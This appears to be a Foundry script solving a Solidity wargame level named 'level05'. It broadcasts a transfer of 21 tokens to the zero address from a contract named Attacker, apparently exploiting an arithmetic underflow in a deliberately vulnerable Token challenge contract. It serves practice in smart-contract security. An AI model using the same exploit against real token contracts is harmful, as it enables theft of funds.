// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel05.sol";

contract Attacker is Script {
    Token level05 = Token(0x2754CE0bB50cC2D6de392Edc65Cbbc0E351f6135);

    function run() external {
        vm.startBroadcast();

        level05.transfer(address(0), 21);

        vm.stopBroadcast();
    }
}
